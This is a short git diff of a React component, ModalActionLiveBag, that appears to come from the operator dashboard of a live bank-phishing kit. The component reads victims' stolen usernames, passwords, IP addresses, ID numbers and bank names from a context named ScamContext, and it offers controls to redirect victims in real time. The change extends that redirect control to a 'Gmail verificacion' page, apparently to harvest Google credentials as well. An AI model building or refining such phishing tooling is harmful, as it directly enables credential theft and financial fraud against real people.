@@ -11,6 +11,7 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
   const [selectPageRedirect, setSelectPageRedirect] = useState('')
   const { socket } = useContext(ScamContext)
   
+  
   const {ip, liveData, urlPage, nroDocument, username, password, nameBank} = bag
   
   return (
@@ -44,7 +45,7 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
                             {textPage != 'Terminar' 
                             ? (
                               <>
-                                {!pageNow ? (<RedirectIconLive nameBank={nameBank} onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />) : null }
+                                {!pageNow || textPage == 'Gmail verificacion' ? (<RedirectIconLive nameBank={nameBank} onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />) : null }
                                 <ErrorIconLive nameBank={nameBank} onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />
                               </>
                             ) : null}
